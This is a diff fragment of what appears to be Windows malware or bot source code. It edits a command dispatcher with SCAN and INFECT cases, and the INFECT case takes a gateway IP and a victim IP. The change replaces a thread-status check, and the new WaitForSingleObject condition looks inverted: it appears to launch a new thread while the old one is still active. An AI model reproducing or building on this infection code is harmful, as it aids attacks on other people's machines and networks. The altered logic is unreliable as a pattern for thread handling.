@@ -272,7 +272,7 @@ void execute_command(pCommand command)
 	{
 	case SCAN:
 		//check if thread not active
-		if (GetExitCodeThread(act_threads[SCAN], NULL) != STILL_ACTIVE)
+		if (WaitForSingleObject(act_threads[SCAN], 0) != WAIT_OBJECT_0)
 		{
 			act_threads[SCAN] = CreateThread(
 				NULL,
@@ -286,7 +286,7 @@ void execute_command(pCommand command)
 		break;
 	case INFECT:
 		//check if thread not active
-		if (GetExitCodeThread(act_threads[INFECT], NULL) != STILL_ACTIVE)
+		if (WaitForSingleObject(act_threads[INFECT], 0) != WAIT_OBJECT_0)
 		{
 			infect_params.gateway_ip = command->gateway_ip;
 			infect_params.victim_ip = command->victim_ip;
